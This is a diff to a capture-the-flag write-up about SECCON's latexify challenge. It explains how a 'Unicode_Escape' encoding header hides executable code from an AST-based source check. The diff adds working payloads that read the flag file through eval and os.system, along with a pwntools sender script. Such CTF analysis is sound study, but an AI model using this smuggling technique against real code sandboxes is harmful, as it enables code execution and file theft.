@@ -99,7 +99,7 @@ Included *Dockerfile* and *requirements.txt* informed us about Python and latexi
 * Python3.10.8 - released a day before (Oct. 11, 2022)
 * latexify-py == 0.1.1 - the freshest version from Pypi repository
 
-Python in the newest version could be read as a hint, that the solutoin won't be some obscure bug from old Python versions. *Latexify* on master was already few commits ahead of the release.
+Python in the newest version could be read as a hint, that the solution won't be some obscure bug from old Python versions. *Latexify* on master was already few commits ahead of the release.
 
 From the source code we can read that:
 * we probably cannot overwrite ```latexify.get_latex``` function, as the ```import latexify``` line is added after defining our function.
@@ -271,7 +271,7 @@ Possible encodings are listed [here](https://docs.python.org/3/library/codecs.ht
 >
 > ~Disconnect3d
 
-We tried an old exploit - and as it happens, somehow AST Parser not always properly reads it, because one of our first tries with the following payload:
+We tried an old exploit:
 ```python
 # Encoding: Unicode_Escape\r\145\166\141\154\050\157\160\145\156 \050\042\146\154\141\147\042\051\056 \162\145\141\144\050\061\060\062\064 \051\051
 
@@ -280,7 +280,9 @@ def foo():
 
 __EOF__
 ```
-Failed the validation - as the debug said, we had two elements in the AST body:
+
+~~and as it happens, somehow AST Parser not always properly reads it, because it failed the validation~~ - the debug said, we had two elements in the AST body:
+
 ```
 AST Dump: ("Module(body=[Expr(value=Call(func=Name(id='eval', ctx=Load()), "
  "args=[Call(func=Attribute(value=Call(func=Name(id='open', ctx=Load()), "
@@ -293,7 +295,37 @@ Body size: 2
 Invalid source
 ```
 
-But on the other attempt from **mrarm**:
+And the above result is because of the mistake in our script, as we were using pwntools like that:
+```python
+from pwn import *
+
+exp = b"""
+# Encoding: Unicode_Escape\n\145\166\141\154\050\157\160\145\156 \050\042\146\154\141\147\042\051\056 \162\145\141\144\050\061\060\062\064 \051\051
+def foo():
+    pass
+
+__EOF__
+"""
+
+try:
+    io = process(['app.py'])
+    io.recvuntil(b'with __EOF__):')
+    io.sendline(exp)
+...
+```
+
+When we had to use rawstring, so rather something like:
+```python
+exp = r"""
+# Encoding: Unicode_Escape\n\145\166\141\154\050\157\160\145\156 \050\042\146\154\141\147\042\051\056 \162\145\141\144\050\061\060\062\064 \051\051
+def foo():
+    pass
+
+__EOF__
+"""
+```
+
+**mrarm** wasn't using pwntools, and by just connecting straight to the task and sending the following payload:
 ```python
 #Encoding: Unicode_Escape
 #\nimport os\nos.system("cat /flag.txt")
@@ -301,7 +333,7 @@ But on the other attempt from **mrarm**:
 def foo():
     pass
 ```
-It just worked:
+He got the flag. The debug from sending the payload correctly:
 ```
 AST Dump: ("Module(body=[FunctionDef(name='foo', args=arguments(posonlyargs=[], args=[], "
  'kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Pass()], '
@@ -313,7 +345,9 @@ Result:
 SECCON{dummy}
 ```
 
-To be honest - I didn't had time to dig deep why there's this difference in parser results, but for sure that's something to verify.
+The important thing here is that the code is executed as a module, not by ```exec``` or ```eval```.   
+During module building Python parses the specified encoding and uses it, which allows the execution of our payload. The AST parser treats the ```# Encoding: Unicode_Escape``` line as a comment, and that's why it's not included in the parsed body.  
+```exec``` or ```eval``` do not parse the ```# Encoding``` line either (they wouldn't decode the source or would use default utf8), and as such if these were used instead, the vulnerability would not exist. 
 
 ---
 
